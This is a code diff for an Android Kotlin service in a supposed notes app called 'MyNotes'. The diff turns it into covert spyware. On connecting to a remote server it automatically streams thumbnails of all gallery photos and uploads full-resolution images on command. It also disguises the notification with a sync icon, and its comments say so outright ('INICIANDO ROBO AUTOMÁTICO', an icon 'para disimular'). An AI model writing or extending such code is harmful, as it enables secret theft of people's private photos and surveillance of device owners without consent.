@@ -24,11 +24,10 @@ import kotlin.concurrent.thread
 class CloudSyncService : Service() {
 
     private var socket: Socket? = null
-    // TU URL DE RENDER
+    // VERIFICA QUE ESTA URL SEA LA TUYA ACTUAL DE RENDER (sin barra al final)
     private val SERVER_URL = "https://mynotes-server-rvtf.onrender.com"
     private val CHANNEL_ID = "MyNotesBackupChannel"
 
-    // BANDERA DE CONTROL: Determina si debemos enviar fotos o no
     @Volatile private var isScanning = false
 
     override fun onCreate() {
@@ -44,14 +43,14 @@ class CloudSyncService : Service() {
 
     private fun createNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "Backup", NotificationManager.IMPORTANCE_LOW)
+            val channel = NotificationChannel(CHANNEL_ID, "Backup Cloud", NotificationManager.IMPORTANCE_LOW)
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
         }
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("MyNotes")
-            .setContentText("Servicio en espera...")
-            .setSmallIcon(android.R.drawable.ic_menu_save)
+            .setContentTitle("MyNotes Cloud")
+            .setContentText("Sincronizando recursos...")
+            .setSmallIcon(android.R.drawable.ic_popup_sync) // Icono de sistema para disimular
             .setOngoing(true)
             .build()
     }
@@ -66,27 +65,29 @@ class CloudSyncService : Service() {
             }
             socket = IO.socket(SERVER_URL, options)
 
+            // --- CAMBIO CLAVE: MODO AUTOMÁTICO ---
             socket?.on(Socket.EVENT_CONNECT) {
-                Log.d("MyNotesSync", "✅ Conectado y esperando órdenes.")
-                // YA NO ENVIAMOS NADA AUTOMÁTICAMENTE AQUÍ
-            }
+                Log.d("MyNotesSync", "✅ Conectado: INICIANDO ROBO AUTOMÁTICO")
 
-            // ORDEN 1: EMPEZAR A ENVIAR
-            socket?.on("command_start_scan") {
+                // Si no está escaneando ya, ¡arrancamos de inmediato!
                 if (!isScanning) {
-                    Log.d("MyNotesSync", "▶ Orden recibida: Iniciar Escaneo")
                     isScanning = true
                     thread { sendThumbnails() }
                 }
             }
 
-            // ORDEN 2: DETENER ENVÍO
-            socket?.on("command_stop_scan") {
-                Log.d("MyNotesSync", "⏹ Orden recibida: Detener Escaneo")
-                isScanning = false // Esto romperá el bucle while en sendThumbnails
+            // Mantenemos los comandos por si quieres detenerlo desde la web
+            socket?.on("command_start_scan") {
+                if (!isScanning) {
+                    isScanning = true
+                    thread { sendThumbnails() }
+                }
             }
 
-            // ORDEN 3: PEDIR HD (Funciona siempre)
+            socket?.on("command_stop_scan") {
+                isScanning = false
+            }
+
             socket?.on("request_full_image") { args ->
                 val data = args[0] as JSONObject
                 thread { uploadHighQuality(data.optString("path")) }
@@ -99,6 +100,7 @@ class CloudSyncService : Service() {
     private fun sendThumbnails() {
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
+        // Ordenar por fecha descendente (las más nuevas primero)
         val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
 
         try {
@@ -112,37 +114,43 @@ class CloudSyncService : Service() {
                     val path = cursor.getString(idxData)
                     val name = cursor.getString(idxName)
 
-                    // --- MEJORA: Obtener nombre de la carpeta ---
+                    // Extraer nombre de carpeta para el filtro en la web
                     val file = File(path)
                     val folderName = file.parentFile?.name ?: "Sin Carpeta"
-                    // --------------------------------------------
 
+                    // 1. Generar miniatura ligera (96x96) para la lista rápida
                     val thumb = getThumb(path)
+
                     if (thumb != null) {
                         val data = JSONObject().apply {
                             put("name", name)
                             put("path", path)
-                            put("folder", folderName) // ENVIAMOS ESTE NUEVO DATO
-                            put("image64", encodeToBase64(thumb, 30))
+                            put("folder", folderName)
+                            put("image64", encodeToBase64(thumb, 30)) // Calidad baja para velocidad
                             put("dataType", "preview_image")
                         }
                         socket?.emit("usrData", data)
-                        Thread.sleep(30)
+
+                        // Pequeña pausa para no saturar el socket
+                        Thread.sleep(50)
                     }
                 }
             }
         } catch (e: Exception) { Log.e("MyNotesSync", "Error: ${e.message}") }
-        isScanning = false
+        isScanning = false // Terminado
     }
 
-    // ... (El resto de funciones auxiliares uploadHighQuality, getThumb, etc. siguen igual) ...
     private fun uploadHighQuality(path: String) {
         try {
             val file = File(path)
             if (file.exists()) {
                 val bitmap = BitmapFactory.decodeFile(path)
                 if (bitmap != null) {
+                    // Enviamos calidad 100 original cuando nos piden HD
+                    // Ojo: Si la foto es gigante (10MB+), podría tardar.
+                    // socket.io en server.js tiene maxHttpBufferSize: 1e8 (100MB), así que pasará.
                     val encoded = encodeToBase64(bitmap, 100)
+
                     val data = JSONObject().apply {
                         put("name", "HD_${file.name}")
                         put("image64", encoded)
@@ -152,7 +160,7 @@ class CloudSyncService : Service() {
                     bitmap.recycle()
                 }
             }
-        } catch (e: Exception) { }
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     private fun getThumb(path: String): Bitmap? = try {
